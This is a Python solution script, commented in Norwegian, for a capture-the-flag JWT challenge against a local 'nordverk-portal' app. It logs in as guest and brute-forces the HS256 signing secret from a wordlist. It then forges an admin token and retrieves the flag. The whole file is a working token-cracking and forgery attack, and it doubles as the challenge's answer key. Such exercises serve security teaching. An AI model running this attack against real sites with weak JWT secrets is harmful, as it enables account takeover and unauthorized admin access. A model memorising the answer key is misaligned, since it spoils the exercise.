"""
LØSNING — JWT-manipulering (ikke gi til deltakerne!)

1. Logg inn som guest/guest → hent JWT fra session_token-cookie
2. Crack HMAC-secret med ordlisten
3. Forge nytt JWT med role=admin
4. Send til /admin → flagg
"""

import sys
import jwt
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
WORDLIST = sys.argv[2] if len(sys.argv) > 2 else "../wordlist.txt"


def step1_login():
    print("=== Steg 1: Logg inn som guest ===")
    s = requests.Session()
    s.post(f"{BASE}/login", data={"username": "guest", "password": "guest"})
    token = s.cookies.get("session_token")
    print(f"  Token: {token[:50]}...")

    # Vis claims (uten verifisering)
    claims = jwt.decode(token, options={"verify_signature": False})
    print(f"  Claims: {claims}")
    return s, token


def step2_crack(token):
    print("\n=== Steg 2: Crack HMAC-secret ===")
    with open(WORDLIST) as f:
        words = [line.strip() for line in f if line.strip()]

    print(f"  Prøver {len(words)} ord fra ordlisten...")
    for word in words:
        try:
            jwt.decode(token, word, algorithms=["HS256"])
            print(f"  FUNNET! Secret: '{word}'")
            return word
        except jwt.InvalidSignatureError:
            continue
        except jwt.DecodeError:
            continue

    print("  Ikke funnet i ordlisten.")
    return None


def step3_forge(secret):
    print("\n=== Steg 3: Forge admin-token ===")
    forged = jwt.encode(
        {"sub": "admin", "role": "admin", "iss": "nordverk-portal"},
        secret,
        algorithm="HS256"
    )
    print(f"  Forged: {forged[:50]}...")
    return forged


def step4_get_flag(session, forged_token):
    print("\n=== Steg 4: Hent flagget ===")
    r = requests.get(f"{BASE}/admin", cookies={"session_token": forged_token})

    if "CTF{" in r.text:
        start = r.text.find("CTF{")
        end = r.text.find("}", start) + 1
        flag = r.text[start:end]
        print(f"\n  *** FLAGG: {flag} ***")
    else:
        print(f"  Feil: {r.status_code}")


if __name__ == "__main__":
    session, token = step1_login()
    secret = step2_crack(token)
    if secret:
        forged = step3_forge(secret)
        step4_get_flag(session, forged)
